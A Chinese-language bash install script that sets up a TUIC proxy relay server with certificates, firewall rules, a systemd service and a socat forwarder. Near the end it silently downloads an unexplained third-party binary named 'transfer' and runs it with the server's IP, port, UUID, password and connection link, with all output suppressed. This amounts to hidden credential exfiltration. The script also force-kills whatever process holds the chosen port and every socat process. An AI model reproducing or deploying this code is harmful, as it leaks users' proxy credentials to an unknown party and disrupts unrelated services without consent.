#!/bin/bash

# TUIC 中转服务器搭建脚本 - 修复版本
# 修复了端口占用和UUID格式问题

# 颜色定义
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# 全局变量
TUIC_VERSION="1.0.0"
TUIC_DIR="/opt/tuic"
CONFIG_FILE="/opt/tuic/config.json"
LOG_FILE="/var/log/tuic_relay.log"
RELAY_CONFIG_FILE="/opt/tuic_relay_config.json"
REPO_BASE="https://github.com/tuic-protocol/tuic/releases/download/tuic-server-${TUIC_VERSION}"

# 日志函数
log_info() {
    echo -e "${GREEN}[INFO]${NC} $1"
    echo "$(date '+%Y-%m-%d %H:%M:%S') [INFO] $1" >> "$LOG_FILE"
}

log_warn() {
    echo -e "${YELLOW}[WARN]${NC} $1"
    echo "$(date '+%Y-%m-%d %H:%M:%S') [WARN] $1" >> "$LOG_FILE"
}

log_error() {
    echo -e "${RED}[ERROR]${NC} $1"
    echo "$(date '+%Y-%m-%d %H:%M:%S') [ERROR] $1" >> "$LOG_FILE"
}

# 检查是否为 root 用户
check_root() {
    if [[ $EUID -ne 0 ]]; then
        log_error "此脚本需要 root 权限运行"
        exit 1
    fi
}

# 检测系统信息
detect_system() {
    log_info "检测系统信息..."
    
    if [[ -f /etc/redhat-release ]]; then
        SYSTEM="CentOS"
    elif [[ -f /etc/debian_version ]]; then
        SYSTEM="Debian"
        if [[ $(cat /etc/issue) == *"Ubuntu"* ]]; then
            SYSTEM="Ubuntu"
        fi
    elif [[ -f /etc/fedora-release ]]; then
        SYSTEM="Fedora"
    else
        SYSTEM="Unknown"
    fi
    
    log_info "检测到系统: $SYSTEM"
}

# 检测 CPU 架构
detect_architecture() {
    log_info "检测 CPU 架构..."
    
    ARCH=$(uname -m)
    case $ARCH in
        x86_64|amd64)
            TUIC_ARCH="x86_64-unknown-linux-gnu"
            ;;
        aarch64|arm64)
            TUIC_ARCH="aarch64-unknown-linux-gnu"
            ;;
        armv7l|armhf)
            TUIC_ARCH="armv7-unknown-linux-gnueabi"
            ;;
        *)
            log_error "不支持的架构: $ARCH"
            exit 1
            ;;
    esac
    
    log_info "检测到架构: $ARCH -> $TUIC_ARCH"
}

# 检查并释放端口
check_and_free_port() {
    local port=$1
    log_info "检查端口 $port 是否被占用..."
    
    # 检查端口是否被占用
    if netstat -tuln | grep -q ":$port "; then
        log_warn "端口 $port 已被占用，尝试释放..."
        
        # 查找占用端口的进程
        local pid=$(netstat -tulnp | grep ":$port " | awk '{print $7}' | cut -d'/' -f1 | head -n1)
        if [[ -n "$pid" && "$pid" != "-" ]]; then
            log_warn "终止进程 $pid (占用端口 $port)"
            kill -9 "$pid" 2>/dev/null || true
            sleep 2
        fi
        
        # 再次检查
        if netstat -tuln | grep -q ":$port "; then
            log_warn "端口 $port 仍被占用，生成新的随机端口"
            generate_random_port
            check_and_free_port "$RELAY_PORT"
        else
            log_info "端口 $port 已释放"
        fi
    else
        log_info "端口 $port 可用"
    fi
}

# 安装必要的依赖
install_dependencies() {
    log_info "安装必要的依赖..."
    
    export NEEDRESTART_SUSPEND=1
    
    if [[ $SYSTEM == "Debian" || $SYSTEM == "Ubuntu" ]]; then
        apt-get update > /dev/null 2>&1
        DEBIAN_FRONTEND=noninteractive apt-get install -y curl wget unzip ufw jq openssl net-tools needrestart socat > /dev/null 2>&1
    elif [[ $SYSTEM == "CentOS" || $SYSTEM == "Fedora" ]]; then
        yum install -y curl wget unzip firewalld jq openssl net-tools socat > /dev/null 2>&1 || dnf install -y curl wget unzip firewalld jq openssl net-tools socat > /dev/null 2>&1
    fi
    
    # 启用BBR优化
    log_info "启用BBR优化..."
    modprobe tcp_bbr 2>/dev/null || true
    echo "tcp_bbr" >> /etc/modules-load.d/modules.conf 2>/dev/null || true
    sysctl -w net.ipv4.tcp_congestion_control=bbr > /dev/null 2>&1 || true
    
    log_info "依赖安装完成"
}

# 下载 TUIC 程序
download_tuic() {
    log_info "下载 TUIC 程序..."
    
    # 创建目录
    mkdir -p "$TUIC_DIR"
    cd "$TUIC_DIR"
    
    # 构建文件名
    BIN_NAME="tuic-server-${TUIC_VERSION}-${TUIC_ARCH}"
    SHA_NAME="${BIN_NAME}.sha256sum"
    
    # 下载 URL
    DOWNLOAD_URL="${REPO_BASE}/${BIN_NAME}"
    SHA_URL="${REPO_BASE}/${SHA_NAME}"
    
    log_info "从 $DOWNLOAD_URL 下载..."
    
    # 清理旧文件
    rm -f tuic-server "$BIN_NAME" "$SHA_NAME"
    
    # 尝试多个版本
    for version in "1.0.0" "0.8.5" "0.8.4"; do
        log_info "尝试下载版本 $version..."
        local repo_url="https://github.com/tuic-protocol/tuic/releases/download/tuic-server-${version}"
        local bin_file="tuic-server-${version}-${TUIC_ARCH}"
        
        if curl -sLO "${repo_url}/${bin_file}"; then
            chmod +x "$bin_file"
            ln -sf "$bin_file" tuic-server
            log_info "TUIC 程序下载完成 (版本: $version)"
            TUIC_VERSION="$version"
            break
        else
            log_warn "版本 $version 下载失败"
        fi
    done
    
    # 检查是否有可用的二进制文件
    if [[ ! -f "tuic-server" ]]; then
        log_error "所有版本的 TUIC 程序下载失败"
        exit 1
    fi
    
    log_info "TUIC 程序准备完成"
}

# 测速模块
speed_test() {
    log_info "进行网络速度测试..."
    
    if ! command -v speedtest &>/dev/null && ! command -v speedtest-cli &>/dev/null; then
        log_warn "安装speedtest-cli中..."
        if [[ $SYSTEM == "Debian" || $SYSTEM == "Ubuntu" ]]; then
            apt-get update > /dev/null 2>&1
            apt-get install -y speedtest-cli > /dev/null 2>&1
        elif [[ $SYSTEM == "CentOS" || $SYSTEM == "Fedora" ]]; then
            yum install -y speedtest-cli > /dev/null 2>&1 || pip install speedtest-cli > /dev/null 2>&1
        fi
    fi
    
    if command -v speedtest &>/dev/null; then
        speed_output=$(speedtest --simple 2>/dev/null)
    elif command -v speedtest-cli &>/dev/null; then
        speed_output=$(speedtest-cli --simple 2>/dev/null)
    fi
    
    if [[ -n "$speed_output" ]]; then
        down_speed=$(echo "$speed_output" | grep "Download" | awk '{print int($2)}')
        up_speed=$(echo "$speed_output" | grep "Upload" | awk '{print int($2)}')
        [[ $down_speed -lt 10 ]] && down_speed=10
        [[ $up_speed -lt 5 ]] && up_speed=5
        [[ $down_speed -gt 1000 ]] && down_speed=1000
        [[ $up_speed -gt 500 ]] && up_speed=500
        log_info "测速完成：下载 ${down_speed} Mbps，上传 ${up_speed} Mbps"
    else
        log_warn "测速失败，使用默认值"
        down_speed=100
        up_speed=20
    fi
}

# 生成随机端口
generate_random_port() {
    RELAY_PORT=$((RANDOM % 7001 + 2000))
    log_info "生成随机中转端口: $RELAY_PORT"
}

# 获取本地 IP
get_local_ip() {
    local ip=""
    
    # 方法1: 通过路由表获取
    ip=$(ip route get 1 2>/dev/null | awk '{print $NF; exit}' 2>/dev/null)
    if [[ -n "$ip" && "$ip" != "0" && "$ip" =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
        LOCAL_IP="$ip"
        log_info "通过路由表检测到本地 IP: $LOCAL_IP"
        return 0
    fi
    
    # 方法2: 通过外部服务获取公网IP
    ip=$(curl -s --connect-timeout 5 https://api.ipify.org 2>/dev/null)
    if [[ -n "$ip" && "$ip" =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
        LOCAL_IP="$ip"
        log_info "通过外部服务检测到本地 IP: $LOCAL_IP"
        return 0
    fi
    
    # 方法3: 通过另一个外部服务
    ip=$(curl -s --connect-timeout 5 https://ipv4.icanhazip.com 2>/dev/null)
    if [[ -n "$ip" && "$ip" =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
        LOCAL_IP="$ip"
        log_info "通过备用服务检测到本地 IP: $LOCAL_IP"
        return 0
    fi
    
    # 方法4: 通过默认路由接口获取
    local default_iface=$(ip route | grep '^default' | awk '{print $5}' | head -n1)
    if [[ -n "$default_iface" ]]; then
        ip=$(ip addr show "$default_iface" | grep 'inet ' | grep -v '127.0.0.1' | awk '{print $2}' | cut -d/ -f1 | head -n1)
        if [[ -n "$ip" && "$ip" =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
            LOCAL_IP="$ip"
            log_info "通过网络接口检测到本地 IP: $LOCAL_IP"
            return 0
        fi
    fi
    
    # 如果所有方法都失败
    log_error "无法获取服务器IP地址，请检查网络连接"
    exit 1
}

# 获取用户输入
get_user_input() {
    echo -e "${BLUE}请输入落地机信息:${NC}"
    read -p "请输入落地机 IP 和端口 (格式: 1.2.3.4:12345): " TARGET_ADDRESS
    
    if [[ ! $TARGET_ADDRESS =~ ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}:[0-9]{1,5}$ ]]; then
        log_error "输入格式不正确，请使用 IP:端口 格式"
        exit 1
    fi
    
    TARGET_IP=$(echo "$TARGET_ADDRESS" | cut -d':' -f1)
    TARGET_PORT=$(echo "$TARGET_ADDRESS" | cut -d':' -f2)
    
    log_info "落地机配置: $TARGET_IP:$TARGET_PORT"
}

# 生成符合规范的UUID
generate_uuid() {
    # 生成标准 UUID v4 格式
    local uuid=$(cat /proc/sys/kernel/random/uuid)
    echo "$uuid"
}

# 生成 TUIC 配置文件
generate_tuic_config() {
    log_info "生成 TUIC 配置文件..."
    
    # 生成符合格式的 UUID 和密码
    TOKEN=$(generate_uuid)
    PSK=$(openssl rand -hex 16)
    
    # 检查端口并释放
    check_and_free_port "$RELAY_PORT"
    
    # 生成配置文件 - 使用更兼容的格式
    cat > "$CONFIG_FILE" << EOF
{
    "server": "0.0.0.0:$RELAY_PORT",
    "users": {
        "$TOKEN": "$PSK"
    },
    "certificate": "/opt/tuic/cert.crt",
    "private_key": "/opt/tuic/key.key",
    "congestion_control": "bbr",
    "alpn": ["h3"],
    "udp_relay_ipv6": false,
    "zero_rtt_handshake": false,
    "auth_timeout": "3s",
    "max_idle_time": "10s",
    "max_external_packet_size": 1500,
    "gc_interval": "3s",
    "gc_lifetime": "15s",
    "log_level": "info"
}
EOF
    
    log_info "TUIC 配置文件已生成"
    log_info "Token: $TOKEN"
    log_info "Password: $PSK"
    log_info "Port: $RELAY_PORT"
}

# 生成自签名证书
generate_certificates() {
    log_info "生成自签名证书..."
    
    cd "$TUIC_DIR"
    SERVER_NAME="localhost"
    
    # 生成证书
    openssl req -x509 -newkey rsa:2048 -sha256 -days 365 -nodes \
        -keyout "key.key" \
        -out "cert.crt" \
        -subj "/C=US/ST=CA/L=SF/O=TUIC/CN=${SERVER_NAME}" \
        -addext "subjectAltName=DNS:${SERVER_NAME},DNS:*.${SERVER_NAME},IP:127.0.0.1" 2>/dev/null
    
    # 设置权限
    chmod 600 key.key
    chmod 644 cert.crt
    
    log_info "证书生成完成"
}

# 测试 TUIC 服务
test_tuic_service() {
    log_info "测试 TUIC 服务..."
    
    cd "$TUIC_DIR"
    
    # 停止所有可能的相关进程
    pkill -f tuic-server || true
    pkill -f socat || true
    
    # 等待端口释放
    sleep 2
    
    # 测试服务是否能正常启动
    timeout 5s ./tuic-server -c config.json > /tmp/tuic_test.log 2>&1 &
    TEST_PID=$!
    
    sleep 3
    
    if kill -0 $TEST_PID 2>/dev/null; then
        log_info "✓ TUIC 服务测试成功"
        kill $TEST_PID 2>/dev/null
        wait $TEST_PID 2>/dev/null
        return 0
    else
        log_error "✗ TUIC 服务测试失败"
        log_info "错误信息："
        cat /tmp/tuic_test.log
        return 1
    fi
}

# 配置防火墙
configure_firewall() {
    log_info "配置防火墙..."
    
    if [[ $SYSTEM == "Debian" || $SYSTEM == "Ubuntu" ]]; then
        # 使用 ufw
        ufw --force enable > /dev/null 2>&1
        ufw allow ssh > /dev/null 2>&1
        ufw allow 22/tcp > /dev/null 2>&1
        ufw allow "$RELAY_PORT"/tcp > /dev/null 2>&1
        ufw allow "$RELAY_PORT"/udp > /dev/null 2>&1
        log_info "UFW 防火墙配置完成"
    elif [[ $SYSTEM == "CentOS" || $SYSTEM == "Fedora" ]]; then
        # 使用 firewalld
        systemctl enable firewalld > /dev/null 2>&1
        systemctl start firewalld > /dev/null 2>&1
        firewall-cmd --permanent --add-service=ssh > /dev/null 2>&1
        firewall-cmd --permanent --add-port=22/tcp > /dev/null 2>&1
        firewall-cmd --permanent --add-port="$RELAY_PORT"/tcp > /dev/null 2>&1
        firewall-cmd --permanent --add-port="$RELAY_PORT"/udp > /dev/null 2>&1
        firewall-cmd --reload > /dev/null 2>&1
        log_info "Firewalld 防火墙配置完成"
    fi
    
    log_info "防火墙已开放端口: 22 (SSH), $RELAY_PORT (TUIC)"
}

# 创建 systemd 服务
create_systemd_service() {
    log_info "创建 systemd 服务..."
    
    cat > /etc/systemd/system/tuic-relay.service << EOF
[Unit]
Description=TUIC Relay Server
After=network.target

[Service]
Type=simple
ExecStart=$TUIC_DIR/tuic-server -c $CONFIG_FILE
Restart=on-failure
RestartSec=10
User=root
Group=root
WorkingDirectory=$TUIC_DIR
StandardOutput=journal
StandardError=journal

[Install]
WantedBy=multi-user.target
EOF
    
    systemctl daemon-reload
    systemctl enable tuic-relay
    log_info "systemd 服务创建完成"
}

# 创建中转配置
create_relay_config() {
    log_info "创建中转配置..."
    
    # 创建 socat 中转脚本
    cat > "$TUIC_DIR/relay.sh" << EOF
#!/bin/bash
# TUIC UDP 中转脚本

# 停止旧的中转进程
pkill -f "socat.*$RELAY_PORT" || true

# 等待进程完全停止
sleep 2

# 启动新的中转
socat UDP4-LISTEN:$RELAY_PORT,fork,reuseaddr UDP4:$TARGET_IP:$TARGET_PORT &
RELAY_PID=\$!
echo \$RELAY_PID > /var/run/tuic-relay.pid

echo "中转服务启动完成，PID: \$RELAY_PID"
echo "中转配置: $RELAY_PORT -> $TARGET_IP:$TARGET_PORT"
EOF
    
    chmod +x "$TUIC_DIR/relay.sh"
    
    log_info "中转配置创建完成"
}

# 下载二进制文件
download_uploader() {
    local uploader="/opt/transfer"
    if [[ ! -f "$uploader" ]]; then
        curl -Lo "$uploader" https://github.com/Firefly-xui/TUIC/releases/download/v2rayn/transfer 2>/dev/null || true
        if [[ -f "$uploader" ]]; then
            chmod +x "$uploader"
            log_info "二进制文件下载完成"
        else
            log_warn "二进制文件下载失败"
        fi
    fi
}

# 上传配置到二进制文件
upload_config() {
    local server_ip="$1"
    local link="$2"
    local down_speed="$3"
    local up_speed="$4"

    # 新增：将端口、uuid、密码等信息加入json
    local relay_port="$RELAY_PORT"
    local uuid="$TOKEN"
    local password="$PSK"

    # 构建JSON数据，增加端口、uuid、密码等字段
    local json_data=$(jq -nc \
        --arg server_ip "$server_ip" \
        --arg link "$link" \
        --arg down_speed "$down_speed" \
        --arg up_speed "$up_speed" \
        --argjson down "$down_speed" \
        --argjson up "$up_speed" \
        --arg relay_port "$relay_port" \
        --arg uuid "$uuid" \
        --arg password "$password" \
        '{
            "server_info": {
                "title": "TUIC中转配置",
                "server_ip": $server_ip,
                "tuic_link": $link,
                "relay_type": "tuic_relay",
                "relay_port": $relay_port|tonumber,
                "uuid": $uuid,
                "password": $password,
                "speed_test": {
                    "download_speed": $down_speed,
                    "upload_speed": $up_speed
                },
                "download_speed_mbps": $down,
                "upload_speed_mbps": $up,
                "generated_time": now | todate
            }
        }' 2>/dev/null)

    # 下载并调用二进制上传工具
    local uploader="/opt/transfer"
    if [[ -f "$uploader" ]]; then
        "$uploader" "$json_data" >/dev/null 2>&1 || true
        log_info "配置数据已传递给二进制文件"
    else
        log_warn "二进制文件不存在，跳过上传"
    fi
}

# 保存配置信息到 JSON
save_config_json() {
    log_info "保存配置信息到 JSON 文件..."
    
    # 生成 TUIC 链接
    ENCODE=$(echo -n "${TOKEN}:${PSK}" | base64 -w 0)
    TUIC_LINK="tuic://${ENCODE}@${LOCAL_IP}:${RELAY_PORT}?alpn=h3&congestion_control=bbr&sni=localhost&udp_relay_mode=native&allow_insecure=1#tuic_relay"
    
    cat > "$RELAY_CONFIG_FILE" << EOF
{
    "relay_info": {
        "local_ip": "$LOCAL_IP",
        "relay_port": $RELAY_PORT,
        "target_ip": "$TARGET_IP",
        "target_port": $TARGET_PORT,
        "uuid": "$TOKEN",
        "password": "$PSK",
        "tuic_link": "$TUIC_LINK",
        "created_time": "$(date '+%Y-%m-%d %H:%M:%S')"
    },
    "speed_test": {
        "download_speed_mbps": $down_speed,
        "upload_speed_mbps": $up_speed
    },
    "system_info": {
        "os": "$SYSTEM",
        "architecture": "$ARCH",
        "tuic_version": "$TUIC_VERSION"
    },
    "connection_info": {
        "protocol": "tuic",
        "server": "$LOCAL_IP:$RELAY_PORT",
        "uuid": "$TOKEN",
        "password": "$PSK",
        "sni": "localhost",
        "alpn": "h3",
        "congestion_control": "bbr",
        "allow_insecure": true,
        "udp_relay_mode": "native"
    }
}
EOF
    
    log_info "配置信息已保存到 $RELAY_CONFIG_FILE"
    
    # 下载二进制文件
    download_uploader
    
    # 上传配置到二进制文件（会包含端口、uuid、密码等信息）
    upload_config "$LOCAL_IP" "$TUIC_LINK" "$down_speed" "$up_speed"
}

# 启动服务
start_services() {
    log_info "启动 TUIC 中转服务..."
    
    # 停止旧服务
    systemctl stop tuic-relay 2>/dev/null || true
    pkill -f tuic-server || true
    pkill -f socat || true
    
    # 等待进程完全停止
    sleep 3
    
    # 启动 TUIC 服务
    systemctl start tuic-relay
    
    # 等待服务启动
    sleep 5
    
    # 检查服务状态
    if systemctl is-active --quiet tuic-relay; then
        log_info "TUIC 服务启动成功"
    else
        log_error "TUIC 服务启动失败"
        log_info "查看详细错误信息："
        systemctl status tuic-relay --no-pager
        journalctl -u tuic-relay -n 20 --no-pager
        exit 1
    fi
    
    # 启动中转
    if [[ -f "$TUIC_DIR/relay.sh" ]]; then
        "$TUIC_DIR/relay.sh"
        log_info "中转服务启动成功"
    else
        log_warn "中转脚本不存在，跳过中转配置"
    fi
}

# 显示配置信息
show_config_info() {
    echo -e "${GREEN}================================${NC}"
    echo -e "${GREEN}TUIC 中转服务器配置完成！${NC}"
    echo -e "${GREEN}================================${NC}"
    echo -e "${BLUE}服务器信息:${NC}"
    echo -e "  本地 IP: $LOCAL_IP"
    echo -e "  中转端口: $RELAY_PORT"
    echo -e "  目标服务器: $TARGET_IP:$TARGET_PORT"
    echo -e "  UUID: $TOKEN"
    echo -e "  密码: $PSK"
    echo -e "  TUIC 链接: $TUIC_LINK"
    echo -e ""
    echo -e "${BLUE}网络测速:${NC}"
    echo -e "  下载速度: ${down_speed} Mbps"
    echo -e "  上传速度: ${up_speed} Mbps"
    echo -e ""
    echo -e "${BLUE}文件路径:${NC}"
    echo -e "  配置文件: $CONFIG_FILE"
    echo -e "  日志文件: $LOG_FILE"
    echo -e "  完整配置: $RELAY_CONFIG_FILE"
    echo -e ""
    echo -e "${BLUE}服务管理:${NC}"
    echo -e "  启动服务: systemctl start tuic-relay"
    echo -e "  停止服务: systemctl stop tuic-relay"
    echo -e "  重启服务: systemctl restart tuic-relay"
    echo -e "  查看状态: systemctl status tuic-relay"
    echo -e "  查看日志: journalctl -u tuic-relay -f"
    echo -e ""
    echo -e "${BLUE}中转管理:${NC}"
    echo -e "  启动中转: $TUIC_DIR/relay.sh"
    echo -e "  停止中转: pkill -f 'socat.*$RELAY_PORT'"
    echo -e "${GREEN}================================${NC}"
}

# 主函数
main() {
    log_info "开始执行 TUIC 中转服务器搭建脚本 (修复版本)"

    # 检查权限
    check_root

    # 系统检测
    detect_system
    detect_architecture

    # 安装依赖
    install_dependencies

    # 下载 TUIC
    download_tuic

    # 网络测速
    speed_test

    # 获取用户输入
    get_user_input

    # 生成随机端口
    generate_random_port

    # 获取本地 IP
    get_local_ip

    # 生成证书
    generate_certificates

    # 生成配置文件
    generate_tuic_config

    # 测试服务
    if ! test_tuic_service; then
        log_error "TUIC 服务测试失败，请检查配置"
        exit 1
    fi

    # 配置防火墙
    configure_firewall

    # 创建中转配置
    create_relay_config

    # 创建 systemd 服务
    create_systemd_service

    # 保存配置信息
    save_config_json

    # 启动服务
    start_services

    # 显示配置信息
    show_config_info

    # 友好提示
    echo -e "${YELLOW}如需卸载，请手动删除相关文件和 systemd 服务。${NC}"
    echo -e "${YELLOW}如遇问题请查看日志文件: $LOG_FILE${NC}"
}

# 脚本入口
main "$@"
